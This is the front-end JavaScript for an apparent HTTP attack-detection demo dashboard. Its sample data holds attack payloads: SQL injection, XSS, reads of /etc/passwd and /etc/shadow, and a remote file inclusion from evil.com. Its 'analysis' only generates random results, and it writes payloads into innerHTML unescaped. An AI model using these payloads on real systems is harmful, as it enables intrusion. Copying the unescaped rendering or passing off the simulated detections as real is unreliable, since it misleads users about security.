// ============================================
// Global State & Sample Data
// ============================================

let currentSection = 'home';
let detectionResults = [];
let isProcessing = false;

// Sample attack data for demo
const sampleAttacks = [
    {
        timestamp: new Date().toISOString(),
        sourceIP: '192.168.1.100',
        url: 'http://example.com/login.php?user=admin\' OR \'1\'=\'1',
        attackType: 'SQL Injection',
        confidence: 0.98,
        action: 'BLOCKED',
        details: {
            method: 'GET',
            userAgent: 'Mozilla/5.0',
            payload: 'admin\' OR \'1\'=\'1',
            signature: 'Union-based SQL injection pattern detected'
        }
    },
    {
        timestamp: new Date(Date.now() - 60000).toISOString(),
        sourceIP: '10.0.0.50',
        url: 'http://example.com/search?q=<script>alert(\'XSS\')</script>',
        attackType: 'Cross-Site Scripting (XSS)',
        confidence: 0.95,
        action: 'BLOCKED',
        details: {
            method: 'GET',
            userAgent: 'curl/7.64.1',
            payload: '<script>alert(\'XSS\')</script>',
            signature: 'Reflected XSS pattern detected'
        }
    },
    {
        timestamp: new Date(Date.now() - 120000).toISOString(),
        sourceIP: '172.16.0.25',
        url: 'http://example.com/download?file=../../../etc/passwd',
        attackType: 'Directory Traversal',
        confidence: 0.92,
        action: 'BLOCKED',
        details: {
            method: 'GET',
            userAgent: 'Python-requests/2.25.1',
            payload: '../../../etc/passwd',
            signature: 'Path traversal sequence detected'
        }
    },
    {
        timestamp: new Date(Date.now() - 180000).toISOString(),
        sourceIP: '203.0.113.45',
        url: 'http://example.com/exec?cmd=cat /etc/shadow',
        attackType: 'Command Injection',
        confidence: 0.97,
        action: 'BLOCKED',
        details: {
            method: 'POST',
            userAgent: 'Burp Suite',
            payload: 'cat /etc/shadow',
            signature: 'OS command injection detected'
        }
    },
    {
        timestamp: new Date(Date.now() - 240000).toISOString(),
        sourceIP: '198.51.100.30',
        url: 'http://example.com/proxy?url=http://internal.server/admin',
        attackType: 'SSRF',
        confidence: 0.89,
        action: 'CHALLENGED',
        details: {
            method: 'GET',
            userAgent: 'Mozilla/5.0',
            payload: 'http://internal.server/admin',
            signature: 'Server-side request forgery attempt'
        }
    },
    {
        timestamp: new Date(Date.now() - 300000).toISOString(),
        sourceIP: '192.0.2.10',
        url: 'http://example.com/include.php?page=http://evil.com/shell.txt',
        attackType: 'Remote File Inclusion',
        confidence: 0.94,
        action: 'BLOCKED',
        details: {
            method: 'GET',
            userAgent: 'SQLmap',
            payload: 'http://evil.com/shell.txt',
            signature: 'RFI pattern with external URL'
        }
    },
    {
        timestamp: new Date(Date.now() - 360000).toISOString(),
        sourceIP: '203.0.113.100',
        url: 'http://example.com/login.php',
        attackType: 'Brute Force',
        confidence: 0.88,
        action: 'MONITORED',
        details: {
            method: 'POST',
            userAgent: 'Hydra',
            payload: 'Multiple login attempts detected',
            signature: '50+ failed login attempts in 2 minutes'
        }
    },
    {
        timestamp: new Date(Date.now() - 420000).toISOString(),
        sourceIP: '198.51.100.75',
        url: 'http://example.com/upload/cmd.jsp',
        attackType: 'Web Shell Upload',
        confidence: 0.99,
        action: 'BLOCKED',
        details: {
            method: 'POST',
            userAgent: 'Mozilla/5.0',
            payload: 'cmd.jsp file upload detected',
            signature: 'Malicious JSP web shell pattern'
        }
    }
];

// Chart instances
let timelineChart, distributionChart, successChart, confidenceChart;

// ============================================
// Initialization
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    initializeNavigation();
    initializeWorkflow();
    initializeDemo();
    initializeDashboard();
    showToast('Welcome to HTTP Attack Detection System!');
});

// ============================================
// Navigation
// ============================================

function initializeNavigation() {
    const navLinks = document.querySelectorAll('.nav-link');
    
    navLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const section = link.dataset.section;
            navigateToSection(section);
        });
    });
}

function navigateToSection(sectionId) {
    // Update active section
    document.querySelectorAll('.section').forEach(section => {
        section.classList.remove('active');
    });
    document.getElementById(sectionId).classList.add('active');
    
    // Update active nav link
    document.querySelectorAll('.nav-link').forEach(link => {
        link.classList.remove('active');
        if (link.dataset.section === sectionId) {
            link.classList.add('active');
        }
    });
    
    currentSection = sectionId;
    
    // Smooth scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ============================================
// Workflow Animation
// ============================================

function initializeWorkflow() {
    const animateBtn = document.getElementById('animateWorkflow');
    const resetBtn = document.getElementById('resetWorkflow');
    
    animateBtn.addEventListener('click', animateWorkflow);
    resetBtn.addEventListener('click', resetWorkflow);
}

function animateWorkflow() {
    const stages = document.querySelectorAll('.workflow-stage');
    resetWorkflow();
    
    stages.forEach((stage, index) => {
        setTimeout(() => {
            stage.classList.add('active');
            
            // Add pulsing effect to current stage
            if (index > 0) {
                stages[index - 1].classList.remove('active');
            }
            
            // Show completion
            if (index === stages.length - 1) {
                setTimeout(() => {
                    showToast('Workflow animation complete!');
                }, 500);
            }
        }, index * 1500);
    });
}

function resetWorkflow() {
    document.querySelectorAll('.workflow-stage').forEach(stage => {
        stage.classList.remove('active');
    });
}

// ============================================
// Demo Functions
// ============================================

function initializeDemo() {
    const analyzeBtn = document.getElementById('analyzeBtn');
    const loadSampleBtn = document.getElementById('loadSampleBtn');
    const exportCSV = document.getElementById('exportCSV');
    const exportJSON = document.getElementById('exportJSON');
    const pcapFile = document.getElementById('pcapFile');
    
    analyzeBtn.addEventListener('click', analyzeInput);
    loadSampleBtn.addEventListener('click', loadSampleData);
    exportCSV.addEventListener('click', () => exportResults('csv'));
    exportJSON.addEventListener('click', () => exportResults('json'));
    
    pcapFile.addEventListener('change', (e) => {
        if (e.target.files.length > 0) {
            showToast(`File selected: ${e.target.files[0].name}`);
        }
    });
}

async function analyzeInput() {
    const urlInput = document.getElementById('urlInput').value;
    const pcapFile = document.getElementById('pcapFile').files[0];
    
    if (!urlInput && !pcapFile) {
        showToast('Please enter URLs or upload a PCAP file', 'warning');
        return;
    }
    
    isProcessing = true;
    showToast('Starting analysis...');
    
    // Animate processing steps
    await animateProcessingSteps();
    
    // Generate results
    if (urlInput) {
        const urls = urlInput.split('\n').filter(url => url.trim());
        generateResults(urls.length);
    } else {
        generateResults(Math.floor(Math.random() * 20) + 10);
    }
    
    isProcessing = false;
    showToast('Analysis complete!', 'success');
}

async function animateProcessingSteps() {
    const steps = document.querySelectorAll('.step');
    
    for (let i = 0; i < steps.length; i++) {
        steps[i].classList.add('active');
        
        await new Promise(resolve => setTimeout(resolve, 800));
        
        steps[i].classList.remove('active');
        steps[i].classList.add('completed');
        
        // Update progress
        const progress = steps[i].querySelector('.progress');
        progress.style.width = '100%';
    }
    
    // Reset after completion
    setTimeout(() => {
        steps.forEach(step => {
            step.classList.remove('completed');
            step.querySelector('.progress').style.width = '0%';
        });
    }, 2000);
}

function loadSampleData() {
    detectionResults = [...sampleAttacks];
    displayResults();
    showToast('Sample attack data loaded successfully!', 'success');
}

function generateResults(count) {
    detectionResults = [];
    
    const attackTypes = [
        'SQL Injection',
        'Cross-Site Scripting (XSS)',
        'Directory Traversal',
        'Command Injection',
        'SSRF',
        'Local File Inclusion',
        'Remote File Inclusion',
        'Brute Force',
        'HTTP Parameter Pollution',
        'XXE Injection',
        'Web Shell Upload'
    ];
    
    const actions = ['BLOCKED', 'CHALLENGED', 'MONITORED', 'ALLOWED'];
    
    for (let i = 0; i < count; i++) {
        const confidence = Math.random();
        let action;
        
        if (confidence > 0.9) action = 'BLOCKED';
        else if (confidence > 0.7) action = 'CHALLENGED';
        else if (confidence > 0.5) action = 'MONITORED';
        else action = 'ALLOWED';
        
        detectionResults.push({
            timestamp: new Date(Date.now() - Math.random() * 3600000).toISOString(),
            sourceIP: `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
            url: `http://example.com/path${i}?param=value${i}`,
            attackType: attackTypes[Math.floor(Math.random() * attackTypes.length)],
            confidence: confidence,
            action: action,
            details: {
                method: Math.random() > 0.5 ? 'GET' : 'POST',
                userAgent: 'Mozilla/5.0',
                payload: 'Sample payload',
                signature: 'Pattern detected by ML engine'
            }
        });
    }
    
    displayResults();
}

function displayResults() {
    if (detectionResults.length === 0) return;
    
    // Update summary
    const totalRequests = detectionResults.length;
    const threatsDetected = detectionResults.filter(r => r.confidence > 0.7).length;
    const suspiciousRequests = detectionResults.filter(r => r.confidence > 0.5 && r.confidence <= 0.7).length;
    const cleanRequests = detectionResults.filter(r => r.confidence <= 0.5).length;
    
    document.getElementById('totalRequests').textContent = totalRequests;
    document.getElementById('threatsDetected').textContent = threatsDetected;
    document.getElementById('suspiciousRequests').textContent = suspiciousRequests;
    document.getElementById('cleanRequests').textContent = cleanRequests;
    
    // Update table
    const tbody = document.querySelector('#resultsTable tbody');
    tbody.innerHTML = '';
    
    detectionResults.forEach((result, index) => {
        const row = document.createElement('tr');
        
        const confidenceClass = result.confidence > 0.9 ? 'critical' : 
                               result.confidence > 0.7 ? 'high' : 
                               result.confidence > 0.5 ? 'medium' : 'low';
        
        const actionClass = result.action.toLowerCase();
        
        row.innerHTML = `
            <td>${new Date(result.timestamp).toLocaleString()}</td>
            <td><code>${result.sourceIP}</code></td>
            <td class="url-cell" title="${result.url}">${truncateUrl(result.url)}</td>
            <td><span class="attack-badge ${confidenceClass}">${result.attackType}</span></td>
            <td><strong>${(result.confidence * 100).toFixed(1)}%</strong></td>
            <td><span class="action-badge ${actionClass}">${result.action}</span></td>
            <td><button class="btn btn-secondary" onclick="showDetails(${index})"><i class="fas fa-info-circle"></i></button></td>
        `;
        
        tbody.appendChild(row);
    });
    
    // Update dashboard
    updateDashboard();
}

function truncateUrl(url) {
    return url.length > 50 ? url.substring(0, 50) + '...' : url;
}

function showDetails(index) {
    const result = detectionResults[index];
    const modal = document.getElementById('detailsModal');
    const modalBody = document.getElementById('modalBody');
    
    modalBody.innerHTML = `
        <div class="detail-row">
            <div class="detail-label">Timestamp:</div>
            <div class="detail-value">${new Date(result.timestamp).toLocaleString()}</div>
        </div>
        <div class="detail-row">
            <div class="detail-label">Source IP:</div>
            <div class="detail-value"><code>${result.sourceIP}</code></div>
        </div>
        <div class="detail-row">
            <div class="detail-label">Full URL:</div>
            <div class="detail-value"><code>${result.url}</code></div>
        </div>
        <div class="detail-row">
            <div class="detail-label">Attack Type:</div>
            <div class="detail-value">${result.attackType}</div>
        </div>
        <div class="detail-row">
            <div class="detail-label">Confidence Score:</div>
            <div class="detail-value"><strong>${(result.confidence * 100).toFixed(2)}%</strong></div>
        </div>
        <div class="detail-row">
            <div class="detail-label">Action Taken:</div>
            <div class="detail-value"><span class="action-badge ${result.action.toLowerCase()}">${result.action}</span></div>
        </div>
        <div class="detail-row">
            <div class="detail-label">HTTP Method:</div>
            <div class="detail-value">${result.details.method}</div>
        </div>
        <div class="detail-row">
            <div class="detail-label">User Agent:</div>
            <div class="detail-value">${result.details.userAgent}</div>
        </div>
        <div class="detail-row">
            <div class="detail-label">Payload:</div>
            <div class="detail-value"><code>${result.details.payload}</code></div>
        </div>
        <div class="detail-row">
            <div class="detail-label">Detection Signature:</div>
            <div class="detail-value">${result.details.signature}</div>
        </div>
    `;
    
    modal.classList.add('active');
}

// Close modal
document.addEventListener('click', (e) => {
    const modal = document.getElementById('detailsModal');
    if (e.target === modal || e.target.classList.contains('modal-close')) {
        modal.classList.remove('active');
    }
});

function exportResults(format) {
    if (detectionResults.length === 0) {
        showToast('No results to export', 'warning');
        return;
    }
    
    let content, filename, mimeType;
    
    if (format === 'csv') {
        content = convertToCSV(detectionResults);
        filename = 'attack_detection_results.csv';
        mimeType = 'text/csv';
    } else {
        content = JSON.stringify(detectionResults, null, 2);
        filename = 'attack_detection_results.json';
        mimeType = 'application/json';
    }
    
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showToast(`Results exported as ${format.toUpperCase()}`, 'success');
}

function convertToCSV(data) {
    const headers = ['Timestamp', 'Source IP', 'URL', 'Attack Type', 'Confidence', 'Action'];
    const rows = data.map(r => [
        r.timestamp,
        r.sourceIP,
        r.url,
        r.attackType,
        r.confidence,
        r.action
    ]);
    
    const csv = [headers, ...rows]
        .map(row => row.map(cell => `"${cell}"`).join(','))
        .join('\n');
    
    return csv;
}

// ============================================
// Dashboard Functions
// ============================================

function initializeDashboard() {
    // Generate initial sample data
    generateDashboardData();
    
    // Initialize charts
    initializeCharts();
    
    // Add filter listeners
    document.getElementById('applyFilters').addEventListener('click', applyFilters);
}

function generateDashboardData() {
    // Generate sample data for the last 24 hours
    detectionResults = [];
    
    for (let i = 0; i < 100; i++) {
        const result = {
            ...sampleAttacks[Math.floor(Math.random() * sampleAttacks.length)],
            timestamp: new Date(Date.now() - Math.random() * 86400000).toISOString()
        };
        detectionResults.push(result);
    }
}

function initializeCharts() {
    // Timeline Chart
    const timelineCtx = document.getElementById('timelineChart');
    if (timelineCtx) {
        timelineChart = new Chart(timelineCtx, {
            type: 'line',
            data: {
                labels: generateTimeLabels(),
                datasets: [{
                    label: 'Attacks Detected',
                    data: generateTimelineData(),
                    borderColor: '#6366f1',
                    backgroundColor: 'rgba(99, 102, 241, 0.1)',
                    tension: 0.4,
                    fill: true
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        labels: { color: '#f1f5f9' }
                    }
                },
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: { color: '#cbd5e1' },
                        grid: { color: '#334155' }
                    },
                    x: {
                        ticks: { color: '#cbd5e1' },
                        grid: { color: '#334155' }
                    }
                }
            }
        });
    }
    
    // Distribution Chart
    const distributionCtx = document.getElementById('distributionChart');
    if (distributionCtx) {
        distributionChart = new Chart(distributionCtx, {
            type: 'doughnut',
            data: {
                labels: ['SQL Injection', 'XSS', 'Directory Traversal', 'Command Injection', 'Other'],
                datasets: [{
                    data: [30, 25, 15, 20, 10],
                    backgroundColor: ['#6366f1', '#8b5cf6', '#ec4899', '#f59e0b', '#10b981']
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        position: 'bottom',
                        labels: { color: '#f1f5f9', padding: 15 }
                    }
                }
            }
        });
    }
    
    // Success Chart
    const successCtx = document.getElementById('successChart');
    if (successCtx) {
        successChart = new Chart(successCtx, {
            type: 'bar',
            data: {
                labels: ['Blocked', 'Challenged', 'Monitored', 'Allowed'],
                datasets: [{
                    label: 'Count',
                    data: [45, 25, 20, 10],
                    backgroundColor: ['#ef4444', '#f59e0b', '#6366f1', '#10b981']
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { display: false }
                },
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: { color: '#cbd5e1' },
                        grid: { color: '#334155' }
                    },
                    x: {
                        ticks: { color: '#cbd5e1' },
                        grid: { color: '#334155' }
                    }
                }
            }
        });
    }
    
    // Confidence Chart
    const confidenceCtx = document.getElementById('confidenceChart');
    if (confidenceCtx) {
        confidenceChart = new Chart(confidenceCtx, {
            type: 'bar',
            data: {
                labels: ['0-50%', '50-70%', '70-90%', '90-100%'],
                datasets: [{
                    label: 'Requests',
                    data: [10, 20, 25, 45],
                    backgroundColor: ['#10b981', '#6366f1', '#f59e0b', '#ef4444']
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { display: false }
                },
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: { color: '#cbd5e1' },
                        grid: { color: '#334155' }
                    },
                    x: {
                        ticks: { color: '#cbd5e1' },
                        grid: { color: '#334155' }
                    }
                }
            }
        });
    }
    
    // Top Attackers List
    updateTopAttackers();
    
    // Attack Map
    createAttackMap();
}

function updateDashboard() {
    if (!timelineChart) {
        initializeCharts();
        return;
    }
    
    // Update charts with current data
    timelineChart.data.datasets[0].data = generateTimelineData();
    timelineChart.update();
    
    const attackCounts = countByAttackType();
    distributionChart.data.datasets[0].data = Object.values(attackCounts);
    distributionChart.update();
    
    const actionCounts = countByAction();
    successChart.data.datasets[0].data = Object.values(actionCounts);
    successChart.update();
    
    const confidenceCounts = countByConfidence();
    confidenceChart.data.datasets[0].data = Object.values(confidenceCounts);
    confidenceChart.update();
    
    updateTopAttackers();
}

function generateTimeLabels() {
    const labels = [];
    for (let i = 23; i >= 0; i--) {
        labels.push(`${i}h ago`);
    }
    return labels;
}

function generateTimelineData() {
    return Array.from({ length: 24 }, () => Math.floor(Math.random() * 20) + 5);
}

function countByAttackType() {
    const counts = {};
    detectionResults.forEach(r => {
        counts[r.attackType] = (counts[r.attackType] || 0) + 1;
    });
    return counts;
}

function countByAction() {
    const counts = { BLOCKED: 0, CHALLENGED: 0, MONITORED: 0, ALLOWED: 0 };
    detectionResults.forEach(r => {
        counts[r.action] = (counts[r.action] || 0) + 1;
    });
    return counts;
}

function countByConfidence() {
    const counts = { '0-50%': 0, '50-70%': 0, '70-90%': 0, '90-100%': 0 };
    detectionResults.forEach(r => {
        if (r.confidence <= 0.5) counts['0-50%']++;
        else if (r.confidence <= 0.7) counts['50-70%']++;
        else if (r.confidence <= 0.9) counts['70-90%']++;
        else counts['90-100%']++;
    });
    return counts;
}

function updateTopAttackers() {
    const ipCounts = {};
    detectionResults.forEach(r => {
        ipCounts[r.sourceIP] = (ipCounts[r.sourceIP] || 0) + 1;
    });
    
    const topIPs = Object.entries(ipCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);
    
    const container = document.getElementById('topAttackers');
    container.innerHTML = topIPs.map((ip, index) => `
        <div class="top-item">
            <div class="top-item-info">
                <div class="top-item-rank">${index + 1}</div>
                <div>
                    <div><code>${ip[0]}</code></div>
                    <div style="font-size: 0.9rem; color: var(--text-secondary);">
                        ${Math.floor(Math.random() * 10) + 1} different attack types
                    </div>
                </div>
            </div>
            <div class="top-item-count">${ip[1]}</div>
        </div>
    `).join('');
}

function createAttackMap() {
    const container = document.getElementById('attackMap');
    container.innerHTML = `
        <svg viewBox="0 0 800 400" xmlns="http://www.w3.org/2000/svg">
            <!-- Simplified world map -->
            <rect width="800" height="400" fill="#0f172a"/>
            <text x="400" y="200" text-anchor="middle" fill="#cbd5e1" font-size="20">
                Attack Origin Visualization
            </text>
            <text x="400" y="230" text-anchor="middle" fill="#64748b" font-size="14">
                (Geographic distribution of attack sources)
            </text>
            
            <!-- Sample attack indicators -->
            <circle cx="150" cy="150" r="5" fill="#ef4444" opacity="0.8">
                <animate attributeName="r" values="5;15;5" dur="2s" repeatCount="indefinite"/>
                <animate attributeName="opacity" values="0.8;0.2;0.8" dur="2s" repeatCount="indefinite"/>
            </circle>
            <circle cx="400" cy="180" r="5" fill="#ef4444" opacity="0.8">
                <animate attributeName="r" values="5;15;5" dur="2s" begin="0.5s" repeatCount="indefinite"/>
                <animate attributeName="opacity" values="0.8;0.2;0.8" dur="2s" begin="0.5s" repeatCount="indefinite"/>
            </circle>
            <circle cx="650" cy="160" r="5" fill="#ef4444" opacity="0.8">
                <animate attributeName="r" values="5;15;5" dur="2s" begin="1s" repeatCount="indefinite"/>
                <animate attributeName="opacity" values="0.8;0.2;0.8" dur="2s" begin="1s" repeatCount="indefinite"/>
            </circle>
        </svg>
    `;
}

function applyFilters() {
    showToast('Filters applied successfully!');
    // In a real application, this would filter the data and update charts
    updateDashboard();
}

// ============================================
// Utility Functions
// ============================================

function showToast(message, type = 'info') {
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');
    const icon = toast.querySelector('i');
    
    toastMessage.textContent = message;
    
    // Update icon based on type
    icon.className = type === 'success' ? 'fas fa-check-circle' : 
                     type === 'warning' ? 'fas fa-exclamation-triangle' : 
                     'fas fa-info-circle';
    
    toast.classList.add('active');
    
    setTimeout(() => {
        toast.classList.remove('active');
    }, 3000);
}

// ============================================
// Add smooth scrolling for all sections
// ============================================

document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({ behavior: 'smooth' });
        }
    });
});
